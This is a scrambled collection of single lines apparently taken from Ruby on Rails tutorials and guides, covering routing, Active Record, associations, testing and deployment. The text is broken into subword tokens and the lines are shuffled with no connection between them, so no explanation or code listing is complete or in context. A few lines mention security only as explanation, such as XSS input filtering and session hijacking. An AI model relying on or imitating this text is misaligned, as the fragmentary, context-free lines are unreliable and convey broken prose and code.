▁| ▁| ▁20 5 ▁| ▁: reset _ content ▁|
▁The ▁way ▁to ▁tell ▁ CarrierWave ▁to ▁associate ▁the ▁image ▁with ▁a ▁model ▁is ▁to ▁use ▁the ▁\ k ode { m o un t \_ uploader } ▁method , ▁which ▁take s ▁as ▁arguments ▁a ▁symbol ▁represent ing ▁the ▁attribute ▁and ▁the ▁class ▁name ▁of ▁the ▁generated ▁ uploader :
▁S te er ▁clear ▁of ▁re serv ed ▁keyword s ▁unless ▁you ▁want ▁the ▁extra ▁functionality ▖
▁* ▁` limit `
▁name ▁var cha r ( 2 55 ),
▁On ▁the ▁other ▁hand , ▁users ▁who ▁try ▁to ▁access ▁a ▁page ▁for ▁which ▁they ▁would ▁ never ▁be ▁ authorize d ▁( such ▁as ▁a ▁logged - in ▁user ▁try ing ▁to ▁access ▁a ▁different ▁user ' s ▁edit ▁page ) ▁will ▁be ▁ redirected ▁to ▁the ▁root ▁URL ▁( Section ~\ ref { sec : requiring _ the _ right _ user }) .
▁production :
▁( F a i l ure ▁to ▁run ▁this ▁Rake ▁task ▁after ▁a ▁migration ▁is ▁a ▁common ▁source ▁of ▁con f us ion .
▁U pgrading ▁from ▁O ld ▁ Version s ▁of ▁Rails
▁As ▁seen ▁in ▁Figure ~\ ref { fig : micropost _ length _ error }, ▁Rails ▁render s ▁\ emph { error ▁messages } ▁indicat ing ▁that ▁the ▁micropost ' s ▁content ▁is ▁too ▁long .
▁ Most ▁common ly , ▁you ▁m ight ▁group ▁a ▁number ▁of ▁ administrative ▁controllers ▁under ▁an ▁` Admin :: ` ▁ namespace ▖
▁The ▁users ▁index ▁page ▁with ▁only ▁one ▁user .
▁as ▁seen ▁in ▁Listing ~\ ref { code : sign _ in _ password _ resets } ▁and ▁Figure ~\ ref { fig : forgot _ password _ link } .
▁For ▁every ▁field ▁( also ▁known ▁as ▁an ▁attribute ) ▁you ▁define ▁in ▁your ▁table , ▁Active ▁Record ▁provides ▁a ▁find er ▁method ▖
▁In ▁other ▁words , ▁a ▁test ▁like
▁The ▁option ▁`: prefix ` ▁add s ▁a ▁prefix ▁to ▁the ▁name ▁of ▁the ▁generated ▁method ▖
▁As ▁required , ▁Listing ~\ ref { code : generate _ users _ controller } ▁creates ▁a ▁Users ▁controller ▁with ▁a ▁\ k ode { new } ▁action ▁( Listing ~\ ref { code : initial _ users _ controller }) ▁and ▁a ▁ stub ▁user ▁view ▁( Listing ~\ ref { code : initial _ new _ action }) .
▁# ▁This ▁is ▁very ▁in efficient ▁when ▁the ▁users ▁table ▁has ▁t housand s ▁of ▁rows .
▁After ▁logging ▁in , ▁we ▁use ▁\ k ode { delete } ▁to ▁issue ▁a ▁\ text tt { DELETE } ▁request ▁to ▁the ▁ logout ▁path ▁( Table ~\ ref { table : RESTful _ sessions }) ▁and ▁verify ▁that ▁the ▁user ▁is ▁logged ▁out ▁and ▁ redirected ▁to ▁the ▁root ▁URL ▖ ▁We ▁also ▁check ▁that ▁the ▁login ▁link ▁re app e ar s ▁and ▁that ▁the ▁ logout ▁and ▁profile ▁links ▁disappear .
▁TIP : ▁For ▁more ▁information ▁about ▁routing , ▁refer ▁to ▁[ Rails ▁ Routing ▁from ▁the ▁Ou t side ▁In ]( routing ▖ html ) .
▁There ▁are ▁cases ▁where ▁the ▁user ▁time ▁ zone ▁m ight ▁be ▁in ▁the ▁future ▁compar ed ▁to ▁the ▁system ▁time ▁ zone , ▁which ▁` Date ▖ today ` ▁uses ▁by ▁default ▖
▁A ▁user ▁then ▁\ k ode { has \_ many ▁: relationships }, ▁and ▁has ▁many ▁\ k ode { followed \_ users } ▁( or ▁\ k ode { followers }) ▁\ emph { through } ▁these ▁relationships .
▁are ▁equivalent , ▁but ▁otherwise ▁you ▁need ▁to ▁use ▁\ k ode { : name } ▁( with ▁the ▁ col on ▁ com ing ▁first ) ▁to ▁ de note ▁a ▁symbol
▁@ account ▁= ▁@ supplier ▖ account
▁resources ▁: comments , ▁only : ▁ [: show , ▁: edit , ▁: update , ▁: destroy ]
▁Client ▖ select (: id )▖ map ( & : id )
▁has _ and _ belongs _ to _ many ▁: assemblies , ▁-> ▁ { ▁group ▁" factory " ▁ }
▁-- no - test - framework
▁By ▁default , ▁all ▁the ▁helpers ▁are ▁available ▁in ▁the ▁views ▁but ▁not ▁in ▁the ▁controllers .
▁TIP : ▁The ▁retrieved ▁record ▁may ▁var y ▁depending ▁on ▁the ▁database ▁engine .
▁name ▁L I K E ▁? ', ▁" % # { query } % "] )
▁The ▁result ▁appears ▁in ▁Listing ~\ ref { code : dependent _ destroy _ test }
▁d ist ance _ of _ time _ in _ words ( Time ▖ now , ▁Time ▖ now ▁+ ▁ 15 ▖ seconds , ▁include _ seconds : ▁true ) ▁# ▁=> ▁less ▁than ▁20 ▁second s
▁#### ▁` descendants `
▁The ▁solution ▁is ▁simple : ▁make ▁sure ▁that ▁you ▁have ▁only ▁one ▁call ▁to ▁` render ` ▁or ▁` redirect ` ▁in ▁a ▁single ▁code ▁path ▖
▁In ▁this ▁case , ▁we ▁want ▁to ▁submit ▁valid ▁information ▁and ▁then ▁confirm ▁that ▁a ▁user ▁\ emph { w as } ▁created .
▁Rake file
▁include ▁Blorgh :: Concern s :: Model s :: Article
▁You ' ll ▁often ▁find ▁this ▁association ▁on ▁the ▁" other ▁ side " ▁of ▁a ▁` belongs _ to ` ▁association ▖
▁This ▁is ▁the ▁ encrypted ▁version ▁of ▁the ▁password ▁(\ k ode {" foobar " }) ▁used ▁to ▁ initialize ▁the ▁user ▁object .
▁#< User ▁id : ▁2, ▁name : ▁" A ▁N other ", ╼ email : ▁" another @ example ▖ org ", ▁created _ at :
▁I ▁find ▁that ▁ having ▁the ▁data ▁model ▁ visible ▁in ▁the ▁model ▁files ▁help s ▁re m in d ▁me ▁which ▁attributes ▁the ▁model ▁has , ▁but ▁future ▁code ▁ listing s ▁will ▁omit ▁the ▁an not ation s ▁for ▁brevity .
▁The ▁ ch o s en ▁value ▁may ▁not ▁always ▁be ▁the ▁same ▁given ▁the ▁same ▁hash :
▁The ▁inheritance ▁hierarchy ▁for ▁the ▁\ k ode { String } ▁class .
▁When ▁Rails ▁look s ▁for ▁a ▁view ▁to ▁render , ▁it ▁will ▁first ▁look ▁in ▁the ▁` app / views `╼ directory ▁of ▁the ▁application ▖
▁We ▁can ▁arrange ▁this ▁with ▁the ▁\ k ode { resources } ▁line ▁show n ▁in ▁Listing ~\ ref { code : account _ activations _ route } .
▁Rails ▁4▖1 ▁introduce s ▁`: plain `, ▁`: html `, ▁and ▁`: body ` ▁options ▁to ▁` render ` ▖
▁belongs _ to ▁: customer
▁Tests ▁for ▁some ▁`` following '' ▁ utility ▁methods ▖
▁invoke ▁ jbuilder _ scaffold _ controller
▁#### ▁ Adding ▁a ▁ Middleware
▁If ▁you ' d ▁like ▁to ▁use ▁your ▁own ▁SQL ▁to ▁find ▁records ▁in ▁a ▁table ▁you ▁can ▁use ▁` find _ by _ sql ` ▖
▁ Adding ▁environment ▁loading ▁to ▁the ▁\ k ode { Spork ▖ pre for k } ▁block .
▁It ▁allows ▁you ▁to ▁write ▁less ╼ code ▁while ▁accomplish ing ▁more ▁than ▁many ▁other ▁languages ▁and ▁framework s .
▁* ▁` update _ counter s `
▁This ▁practice ▁will ▁prevent ▁conflicts ▁with ▁the ▁main ▁tutorial .
▁We ▁start ▁with ▁the ▁inheritance ▁structure ▁for ▁models .
▁ { nil ▁=> ▁nil , ▁1 ▁=> ▁1, ▁nested : ▁ { a : ▁3 , ▁5 ▁=> ▁ 5}} ▖ deep _ transform _ keys ▁ { ▁| key | ▁key ▖ to _ s ▖ upcase ▁ }
▁R at her ▁than ▁ r epeat ing ▁the ▁main ▁layout ▁and ▁edit ing ▁it , ▁you ▁can ▁accomplish ▁this ▁by ▁using ▁nested ▁ layouts ▁( some times ▁called ▁sub - template s )▖
▁The ▁Home ▁page ▁with ▁an ▁added ▁ footer .
▁GitHub ╼ Issue s ▁are ▁not ▁a ▁particular ly ▁good ▁ ve n ue ▁for ▁the ▁some times ▁long ▁and ▁involve d ╼ d is c us s ion s ▁new ▁features ▁require .
▁* ▁` asset - url ` ▁with ▁two ▁arguments ▁is ▁ deprecated ▖
▁| ▁POST ▁| ▁ / kategorien ▁| ▁categories # create ▁| ▁categories _ path ▁|
▁* ▁`: maximum ` ▁- ▁The ▁attribute ▁cannot ▁have ▁more ▁than ▁the ▁specified ▁length .
▁# ▁active _ support / dependencies ▖ rb
▁Fix ing ▁these ▁issues ▁will ▁require ▁some ▁trick er y , ▁but ▁the ▁result ▁will ▁be ▁a ▁far ▁more ▁powerful ▁test ▁suite .
▁| ▁| ▁10 2 ▁| ▁: process ing ▁|
▁For ▁example : ▁` asset - url (" rails ▖ png ", ▁image ) ` ▁becomes ▁` asset - url (" rails ▖ png ") ` .
▁| ▁--------- ▁| ▁-------------- ▁| ▁- ---------------- ▁| ▁-------------- --------------- ---------------- ▁|
▁Or ▁ ordering ▁by ▁multiple ▁fields :
▁<%= ▁image _ tag ▁" header ▖ png " ▁%>
▁The ╼ JSON ▁gem ▁API s ▁will ▁function ▁as ▁normal , ▁but ▁they ▁will ▁not ▁have ▁access ▁to ▁any ╼ Rails - specific ▁features ▖
▁PATCH
▁$ ▁bundle ▁exec ▁rake ▁test : sqlite 3
▁array ▁# ▁=> ▁[ ' string ']
▁ BigDecimal ▖ new ( 5▖0 0, ▁6 )▖ to _ formatted _ s (" e ") ▁# ▁=> ▁" 0▖5 E 1 "
▁def ▁destroy
▁Similar ly , ▁the ▁second ▁assignment ▁is ▁\ text tt {@ foo ▁|| ▁" baz " }, ▁i ▖ e ▖ , ▁\ text tt {" bar " ▁|| ▁" baz " }, ▁which ▁also ▁evaluate s ▁to ▁\ text tt {" bar "} .
▁ category ▖ articles ▖ published ▁# ▁=> ▁[ published ▁articles ▁ belonging ▁to ▁this ▁ category ]
▁For ▁example , ▁setting ▁` I 18 n ▖ locale ▁= ▁: de ` ▁and ▁creating ▁` public / 5 00 ▖ de ▖ html ` ▁and ▁` public / 4 04 ▖ de ▖ html ` ▁would ▁allow ▁you ▁to ▁have ▁local ize d ▁ rescue ▁pages .
▁ Fi el d ing , ▁R o y ▁ Thomas .
▁* ▁How ▁to ▁quickly ▁generate ▁the ▁starting ▁pieces ▁of ▁a ▁Rails ▁application .
▁Note ▁that ▁we ' ve ▁also ▁taken ▁this ▁opportunit y ▁to ▁arrange ▁for ▁the ▁\ text tt { sqlite 3 } ▁gem ▁to ▁be ▁included ▁only ▁in ▁a ▁development ▁or ▁test ▁environment ▁( Section ~\ ref { sec : rails _ environments }), ▁which ▁prevent s ▁ po t en tial ▁conflicts ▁with ▁the ▁database ▁used ▁by ▁Heroku ▁( Section ~\ ref { sec : deploying }) .
▁S ince ▁we ' ll ▁be ▁making ▁a ▁controller ▁to ▁handle ▁static ▁pages , ▁we ' ll ▁call ▁it ▁the ▁Static ▁Pages ▁controller , ▁design at ed ▁by ▁the ▁\ href { https :// en ▖ w ikipedia ▖ org / wiki / CamelCase } { CamelCase } ▁name ▁\ k ode { StaticPages } .
▁### ▁ sprockets - rails
▁This ▁is ▁es pecially ▁useful ▁in ▁production ▁since ▁you ▁should ▁not ▁commit ▁ secrets ▁like ▁your ▁database ▁password ▁into ▁your ▁source ▁control ▁( such ▁as ▁Git ) .
▁However , ▁you ▁m ight ▁want ▁to ▁consider ▁mov ing ▁it ▁to ▁a ▁template ▁file ▁if ▁the ▁markup ╼ is ▁complex .
▁In ▁Listing ~\ ref { code : email _ downcase }, ▁we ▁could ▁have ▁written ▁the ▁assignment ▁as
▁As ▁in ▁Section ~\ ref { sec : requiring _ logged _ in _ users } ▁and ▁Section ~\ ref { sec : requiring _ the _ right _ user }, ▁we ' ll ▁enforce ▁access ▁control ▁using ▁a ▁before ▁filter , ▁this ▁time ▁to ▁restrict ▁access ▁to ▁the ▁\ k ode { destroy } ▁action ▁to ▁admin s .
▁static - pages
▁### ▁M u t at or ▁methods ▁called ▁on ▁ Relation
▁The ▁aux i li ary ▁file ▁is ▁written ▁in ▁a ▁standard ▁directory ▁for ▁temporary ▁files , ▁but ▁you ▁can ▁pass ▁a ▁directory ▁of ▁your ▁choice ▁as ▁second ▁argument .
▁In ▁fact , ▁this ▁is ▁very ▁close ▁to ▁the ▁syntax ▁that ▁Rails ▁uses ▁to ▁declare ▁this ╼ association ▖
▁ ╼ ▁$ ▁ subl ▁ .
▁The ▁method ▁understand s ▁ qualified ▁table ▁names :
▁in ▁Listing ~\ ref { code : generate _ micropost _ model } .
▁class ▁As se mb ly ▁< ▁ActiveRecord :: Base
▁Here ▁we ' ve ▁test ed ▁the ▁appearance ▁of ▁the ▁ signout ▁link ▁to ▁verify ▁that ▁the ▁user ▁was ▁successfully ▁signed ▁in ▁after ▁ signing ▁up .
▁ delivery _ options ▁= ▁ { ▁user _ name : ▁ com p any ▖ smtp _ user ,
▁" B ackoffice :: UsersController "▖ deconstantize ▁# ▁=> ▁" B ackoffice "
▁"2010-07-27 ▁23:37:00 "▖ to _ time ▁# ▁=> ▁Tue ▁Ju l ▁ 27 ▁23:37:00 ▁UTC ▁2010
▁* ▁` d ec re ment _ counter `
▁The ▁Home ▁page ▁after ▁creating ▁a ▁new ▁micropost .
▁ Only ▁available ▁if ▁` config ▖ action _ controller ▖ session _ store ` ▁is ▁set ▁to ▁a ▁value .
▁As ▁show n ▁in ▁Figure ~\ ref { fig : cloud 9 _ two _ space s }, ▁you ▁can ▁do ▁this ▁by ▁click ing ▁the ▁ ge ar ▁ icon ▁in ▁the ▁upper ▁right ▁and ▁then ▁select ing ▁`` Code ▁ Edit or ▁( A ce ) '' ▁to ▁edit ▁the ▁`` S of t ▁T abs '' ▁setting .
▁To ▁get ▁started , ▁let ' s ▁start ▁work ▁on ▁an ▁\ k ode { updating - users } ▁topic ▁branch :
▁This ▁is ▁used ▁by ▁the ▁Rails ╼ helper ▁methods ▁to ▁avoid ▁hand ing ▁the ▁m app ing ▁requests ▁back ▁to ▁Sprockets ▖
▁By ▁passing ▁the ▁optional ▁parameters ▁\ k ode { name : string } ▁and ▁\ k ode { email : string }, ▁we ▁tell ▁Rails ▁about ▁the ▁two ▁attributes ▁we ▁want , ▁along ▁with ▁which ▁types ▁those ▁attributes ▁should ▁be ▁( in ▁this ▁case , ▁\ k ode { string }) .
▁# ▁=> ▁#< Client ▁id : ▁1, ▁first _ name : ▁" Andy ", ▁orders _ count : ▁ 0, ▁ locked : ▁true , ▁created _ at : ▁"2011- 08 - 30 ▁06:09:27" , ▁updated _ at : ▁"2011- 08 - 30 ▁06:09:27" >
▁Rails ' ▁old ▁strategy ▁was ▁to ▁ append ▁a ▁date - base d ▁query ▁string ▁to ▁every ▁asset ▁link ed ╼ with ▁a ▁built - in ▁helper ▖
▁Heroku ▁make s ▁ deploying ▁Rails ▁applications ▁ r id ic ul ous ly ▁easy --- as ▁long ▁as ▁your ▁source ▁code ▁is ▁under ▁version ▁control ▁with ▁Git .
▁By ▁ filling ▁in ▁the ▁missing ▁elements ▁in ▁Listing ~\ ref { code : login _ create _ user _ instance } ▁and ▁Listing ~\ ref { code : i mprov ed _ remember _ me _ test } ▁( in d icated ▁with ▁question ▁mark s ~\ k ode { ?}\ ▁and ▁\ k ode { FILL \_ IN }), ▁complete ▁this ▁improve d ▁test ▁of ▁the ▁`` remember ▁me '' ▁checkbox .
▁ SELECT ▁articles .
▁has _ one ▁: account
▁If ▁you ▁have ▁an ▁empty ▁` config / database ▖ yml ` ▁file ▁but ▁your ▁` ENV [' DAT A BASE _ URL ']` ▁is ▁present , ▁then ▁Rails ▁will ▁ connect ▁to ▁the ▁database ▁via ▁your ▁environment ▁variable :
▁\ begin { equ ation }╼\ label { eq : time _ com p ar is on } ╼ t _ r ▁< ▁t _ e .
▁If ▁any ▁of ▁the ▁validations ▁fail , ▁the ▁` errors ` ▁collection ▁will ▁be ▁ filled ▁again .
▁In ▁this ▁case , ▁we ' re ▁look ing ▁for
▁Of ▁course , ▁we ▁don ' t ▁need ▁the ▁default ▁Rails ▁page ▁in ▁the ▁long ▁run , ▁but ▁it ' s ▁nice ▁to ▁see ▁it ▁working ▁for ▁now .
▁E s pecially ▁for ▁XSS , ▁it ▁is ▁important ▁to ▁do ▁ _ white list ▁input ▁filter ing ▁instead ▁of ▁blacklist _ ▖
▁{" development "=>{" adapt er "=>" postgresql ", ▁" host "=>" localhost ", ▁" database "=>" my _ database "} }
▁### ▁What ▁is ▁F ing er print ing ▁and ▁ W h y ▁S h o ul d ▁I ▁C a re ?
▁Because ▁test ▁suite s ▁can ▁become ▁quite ▁ s low ▁even ▁for ▁relative ly ▁small ▁ projects , ▁being ▁able ▁to ▁run ▁one ▁test ▁( or ▁a ▁small ▁group ▁of ▁tests ) ▁at ▁a ▁time ▁can ▁be ▁a ▁h ug e ▁ w in .
▁</ ul > S e e ▁[ API ▁ docs ]( http :// api ▖ rubyonrails ▖ org / classes / ActionMailer / Base ▖ html ) ▁for ▁more ▁ info .
▁If ▁you ▁read ▁much ▁about ▁Ruby ▁on ▁Rails ▁web ▁development , ▁you ' ll ▁see ▁a ▁lot ▁of ▁ references ▁to ▁`` REST '' , ▁which ▁is ▁an ▁ acronym ▁for ▁ RE presentational ▁ State ▁ Transfer .
▁@ assembly _ id s ▁= ▁@ part ▖ assembly _ id s
▁If ▁you ' d ▁like ▁feedback ▁on ▁an ▁idea ▁for ▁a ▁feature ▁before ▁doing ▁the ▁work ▁for ▁make ╼ a ▁ patch , ▁please ▁send ▁an ▁email ▁to ▁the ▁[ rails - core ▁mail ing ╼ list ]( https :// groups ▖ google ▖ com / forum / ? from groups # ! forum / rubyonrails - core )▖ ▁You ╼ m ight ▁get ▁no ▁response , ▁which ▁means ▁that ▁every one ▁is ▁ indifferent ▖
▁Let ' s ▁start ▁explor ing ▁strings ▁with ▁the ▁console , ▁this ▁time ▁started ▁with ▁\ k ode { rails ~ c }, ▁which ▁is ▁a ▁shortcut ▁for ▁\ k ode { rails ▁console } :
▁( This ▁is ▁because ▁the ▁HTTP ▁standard ▁technical ly ▁requires ▁a ▁full ▁URL ▁after ▁redirect s , ▁though ▁in ▁most ▁browsers ▁it ▁will ▁work ▁either ▁way ▖)
▁has _ and _ belongs _ to _ many ▁Association ▁D iagram ]( images / ha b t m ▖ png )
▁As ▁we ▁saw ▁brief ly ▁before ▁in ▁the ▁Chapter ~\ ref { cha : a _ toy _ app } ▁ exercises , ▁the ▁way ▁to ▁validate ▁the ▁presence ▁of ▁the ▁name ▁attribute ▁is ▁to ▁use ▁the ▁\ k ode { validates } ▁method ▁with ▁argument ▁\ k ode { presence : ▁true }, ▁as ▁show n ▁in ▁Listing ~\ ref { code : validates _ presence _ of _ name } .
▁( This ▁is ▁a ▁some what ▁advanced ▁Ruby ▁topic , ▁so ▁don ' t ▁worry ▁if ▁it ▁doesn ' t ▁make ▁sense ▁right ▁a way ▖)
▁For ▁example , ▁given
▁This ▁is ▁an ▁unlike ly ▁combination ▁of ▁events , ▁and ▁with ▁the ▁application ▁as ▁present ly ▁construct ed ▁it ▁isn ' t ▁necessary , ▁but ▁because ▁it ' s ▁security - rel at ed ▁I ▁include ▁it ▁for ▁completeness .
▁invoke ▁test _ unit
▁If ▁you ' re ▁used ▁to ▁using ▁raw ▁SQL ▁to ▁find ▁database ▁records , ▁then ▁you ▁will ▁generally ▁find ▁that ▁there ▁are ▁better ▁ways ▁to ▁c ar ry ▁out ▁the ▁same ▁operations ▁in ▁Rails ▖
▁now ▖ all _ week (: sunday )
▁#### ▁Configur ing ▁a ▁ MySQL ▁Database
▁ Example s :
▁It ' s ▁not ▁important ▁at ▁this ▁point ▁to ▁understand ▁the ▁syntax ▁in ▁Listing ~\ ref { code : default _ controller _ test } ▁in ▁detail , ▁but ▁we ▁can ▁see ▁that ▁there ▁are ▁two ▁tests , ▁one ▁for ▁each ▁controller ▁action ▁we ▁included ▁on ▁the ▁command ▁line ▁in ▁Listing ~\ ref { code : generating _ pages } .
▁The ▁sample ▁application ▁site ▁layout ▖
▁This ▁means ▁we ▁can ▁use
▁class ▁ Product ▁< ▁ActiveRecord :: Base
▁By ▁replacing ▁the ▁question ▁mark s ▁in ▁Listing ~\ ref { code : string _ shuffle } ▁with ▁the ▁appropriate ▁methods , ▁combine ▁\ k ode { split }, ▁\ k ode { shuffle }, ▁and ▁\ k ode { join } ▁to ▁write ▁a ▁function ▁that ▁ shuffle s ▁the ▁letter s ▁in ▁a ▁given ▁string .
▁╼╼ This ▁is ▁the ▁first ▁application ▁for ▁the ╼[ * Ruby ▁on ▁Rails ▁Tutorial * ]( http :// www ▖ railstutorial ▖ org / )╼ by ▁[ Michael ▁Hartl ]( http :// www ▖ michael hartl ▖ com / ) .
▁We ▁then ▁verify ▁that ▁the ▁\ k ode { create } ▁and ▁\ k ode { destroy } ▁actions ▁do ▁the ▁correct ▁things ▁when ▁hit ▁with ▁an ▁Ajax ▁request .
▁ ide ▁the ▁IDE ▁itself ▖ )╼╼ ▁\ subsection { A ▁user ▁to ur } ▁% ▁( fold )╼ ▁\ label { sec : a _ user _ tour }╼╼
▁Wi ld card ▁segment s ▁can ▁occur ▁any where ▁in ▁a ▁route ▖
▁| vendor / | A ▁place ▁for ▁all ▁third - part y ▁code ▖
▁More over , ▁this ▁usage ▁matches ▁up ▁with ▁the ▁commit ▁messages ▁generated ▁by ▁Git ▁commands ▁themselves .
▁The ▁ chain ▁is ▁returned ▁in ▁an ▁array , ▁from ▁bottom ▁to ▁to p :
▁class ▁ Employee ▁< ▁ActiveRecord :: Base
▁TIP ▖ ▁P lease ▁ squash ▁your ▁commit s ▁into ▁a ▁single ▁commit ▁when ▁appropriate ▖
▁In ▁that ▁case ▁Rails ▁must ▁re raise ▁the ▁exception ▖
▁This ▁is ▁part ▁of ▁what ▁make s ▁them ▁confusing ▖)
▁It ▁defaults ▁to ▁` ' - ' `, ▁which ▁turn s ▁on ▁tri m m ing ▁of ▁ tail ▁spaces ▁and ▁new line ▁when ▁using ▁` <%= ▁- % >` ▁or ▁` <%= ▁= % >` ▖
▁We ▁will ▁identify ▁privilege d ▁ administrative ▁users ▁with ▁a ▁boolean ▁\ k ode { admin } ▁attribute ▁in ▁the ▁User ▁model , ▁which ▁will ▁lead ▁automatically ▁to ▁an ▁\ k ode { admin ?}\ ▁boolean ▁method ▁to ▁test ▁for ▁admin ▁status .
▁There ▁are ▁ s i x ▁asset ▁tag ▁helpers ▁available ▁in ▁Rails :
▁A ▁mockup ▁of ▁our ▁best ▁guess ▁at ▁the ▁final ▁profile ▁page .
▁# ▁G ive ▁add _ invoices ▁an ▁array ▁of ▁1 000 ▁ invoices ▁at ▁a ▁time
▁In ter ce p ting ▁E mail s
▁T w o ▁of ▁these ▁symbols ▁are ▁special : ▁`: controller ` ▁map s ▁to ▁the ▁name ▁of ▁a ▁controller ▁in ▁your ▁application , ▁and ▁`: action ` ▁map s ▁to ▁the ▁name ▁of ▁an ▁action ▁within ▁that ▁controller ▖
▁has _ many ▁: orders , ▁ dependent : ▁: destroy
▁We ' ll ▁ begin ▁by ▁review ing ▁the ▁route ▁for ▁the ▁Home ▁page ▁( defined ▁in ▁Section ~\ ref { sec : set ting _ the _ root _ route }), ▁which ▁is ▁a ▁special ▁case , ▁and ▁then ▁define ▁a ▁set ▁of ▁routes ▁for ▁the ▁re main ing ▁static ▁pages .
▁in ▁Listing ~\ ref { code : user _ show _ action } ▁find s ▁the ▁user ▁with ▁id ~\ text tt {1} .
▁< strong > Comment er : </ strong >
▁With ▁hash ▁conditions , ▁you ▁pass ▁in ▁a ▁hash ▁with ▁keys ▁of ▁the ▁fields ▁you ▁want ▁ condition al is ed ▁and ▁the ▁values ▁of ▁how ▁you ▁want ▁to ▁ condition al is e ▁them :
▁This ▁even ▁applies ▁to ▁parameters ▁that ▁you ▁do ▁not ▁specify ▁as ▁dynamic ▁segment s ▖
▁Convert ing ▁Listing ~\ ref { code : footer _ css } ▁by ▁hand ▁is ▁a ▁good ▁exercise , ▁and ▁you ▁should ▁verify ▁that ▁the ▁CSS ▁ still ▁works ▁properly ▁after ▁the ▁con version .
▁in ▁Listing ~\ ref { code : custom _ about _ page } .
▁------------ ---------------- ----------------
▁With ▁a ▁book ▁index , ▁on ▁the ▁other ▁hand , ▁you ▁can ▁just ▁look ▁up ▁`` foobar '' ▁in ▁the ▁index ▁to ▁see ▁all ▁the ▁pages ▁containing ▁`` foobar '' .
▁### ▁Configur ing ▁Active ▁Record
▁L uckily , ▁Rails ▁includes ▁a ▁default ▁\ k ode { alt } ▁attribute ; ▁if ▁you ▁don ' t ▁specify ▁the ▁attribute ▁in ▁the ▁call ▁to ▁\ k ode { image \_ tag }, ▁Rails ▁just ▁uses ▁the ▁image ▁filename ▁( m in us ▁extension ) .
▁In ▁this ▁case , ▁`` a ▁user ▁visit s ▁the ▁signin ▁page '' ▁is ▁implemented ▁by
▁In ▁contrast ▁to ▁previous ▁model ▁validations , ▁file ▁size ▁validation ▁doesn ' t ▁correspond ▁to ▁a ▁built - in ▁Rails ▁validator .
▁This ▁is ▁because , ▁in ▁the ▁case ▁of ▁a ▁\ k ode { : followers } ▁attribute , ▁Rails ▁will ▁ singularize ▁`` followers '' ▁and ▁automatically ▁look ▁for ▁the ▁foreign ▁key ▁\ k ode { follower \_ id } ▁in ▁this ▁case .
▁Having ▁verifie d ▁by ▁hand ▁that ▁the ▁application ▁is ▁be having ▁properly ▁upon ▁successful ▁login , ▁before ▁mov ing ▁on ▁we ' ll ▁write ▁an ▁integration ▁test ▁to ▁capture ▁that ▁behavior ▁and ▁catch ▁re gr ess ion s .
▁create ▁db / migrate / [ timestamp ] _ create _ blorgh _ articles ▖ rb
▁There ' s ▁just ▁one ▁small ▁problem , ▁the ▁c a ve at ▁all u d ed ▁to ▁above :
▁( Session ▁hijacking ▁was ▁ wide ly ▁public ize d ▁by ▁the ▁\ href { http :// code but ler ▖ com / f iresheep } { F iresheep } ▁application , ▁which ▁show ed ▁that ▁remember ▁token s ▁at ▁many ▁high - profile ▁site s ▁were ▁ visible ▁when ▁ connect ed ▁to ▁public ▁Wi - Fi ▁ net work s .
▁We ▁start ▁with ▁a ▁request ▁issue d ▁from ▁the ▁browser --- i ▖ e ▖ , ▁the ▁result ▁of ▁typing ▁a ▁URL ▁in ▁the ▁address ▁bar ▁or ▁click ing ▁on ▁a ▁link ▁( Step ~ 1 ▁in ▁Figure ~\ ref { fig : mvc _ detailed }) .
▁( Don ' t ▁worry ▁about ▁what ▁the ▁\ k ode { - u } ▁flag ▁does ; ▁if ▁you ' re ▁curious , ▁do ▁a ▁web ▁search ▁for ▁`` git ▁set ▁ upstream '' ▖)
▁Note ▁that , ▁in ▁Table ~\ ref { table : valid _ email _ regex }, ▁`` let ter '' ▁really ▁means ▁`` low er - case ▁letter '' , ▁but ▁the ▁\ k ode { i } ▁at ▁the ▁end ▁of ▁the ▁ regex ▁enforce s ▁case - insensitive ▁matching .
▁create ▁test / fixtures / microposts ▖ yml
▁The ▁` limit ` ▁method ▁let s ▁you ▁restrict ▁the ▁total ▁number ▁of ▁objects ▁that ▁will ▁be ▁fetch ed ▁through ▁an ▁association .
▁The ▁changes ▁in ▁this ▁section ▁should ▁be ▁made ▁on ▁the ▁master ▁branch :
▁ { start _ date : ▁params [: start _ date ] , ▁end _ date : ▁params [: end _ date ] })
▁You ▁can ▁redirect ▁any ▁path ▁to ▁another ▁path ▁using ▁the ▁` redirect ` ▁helper ▁in ▁your ▁route r :
▁# ▁ Sign ▁in ▁when ▁not ▁using ▁Capybara .
▁Next , ▁you ▁have ▁to ▁tell ▁Rails ▁where ▁your ▁actual ▁ home ▁page ▁is ▁located .
▁You ▁can ▁supply ▁a ▁`: method ` ▁argument ▁to ▁specify ▁the ▁HTTP ▁verb :
▁The ▁method ▁` welcome _ email ` ▁returns ▁a ▁` ActionMailer :: Message Delivery ` ▁object ▁which ╼ can ▁then ▁just ▁be ▁to ld ▁` deliver _ now ` ▁or ▁` deliver _ later ` ▁to ▁send ▁itself ▁out ▖
▁By ▁definition , ▁an ▁object ▁is ▁valid ▁if ▁this ▁collection ▁is ▁empty ▁after ▁running ╼ validations .
▁P lease ▁consult ▁the ▁ RDoc ▁documentation ▁for ▁help ▁with ▁the ╼[ m ar k up ]( http :// docs ▖ s eattle rb ▖ org / rdoc / RDoc / M ar k up ▖ html ) ,╼ and ▁also ▁take ▁into ▁account ▁these ▁[ additional ╼ directive s ]( http :// docs ▖ s eattle rb ▖ org / rdoc / RDoc / P ar s er / Ruby ▖ html ) .
▁The ▁ alternative ▁is ▁to ▁use ▁` try ` ▖ ▁` try ` ▁is ▁like ▁` Object # send ` ▁except ▁that ▁it ▁returns ▁` nil ` ▁if ▁sent ▁to ▁` nil ` .
▁A ▁new line ▁is ▁what ▁comes ▁at ▁the ▁end ▁of ▁a ▁line , ▁there by ▁starting ▁a ▁new ▁line .
▁In side ▁the ▁test ▁directory ▁there ▁is ▁the ▁` test / integration ` ▁directory , ▁where ╼ integration ▁tests ▁for ▁the ▁engine ▁should ▁be ▁placed ▖
▁In ▁production ,╼ Rails ▁insert s ▁an ▁M D 5 ▁fingerprint ▁into ▁each ▁filename ▁so ▁that ▁the ▁file ▁is ▁cached ╼ by ▁the ▁web ▁browser ▖
▁Be side s ▁that , ▁one ▁can ▁use ▁` deep _ stringify _ keys ` ▁and ▁` deep _ stringify _ keys !` ▁to ▁ stringify ▁all ▁the ▁keys ▁in ▁the ▁given ▁hash ▁and ▁all ▁the ▁hashes ▁nested ▁into ▁it ▖
▁En s ur ing ▁email ▁uniqueness ▁by ▁downcas ing ▁the ▁email ▁attribute ▖
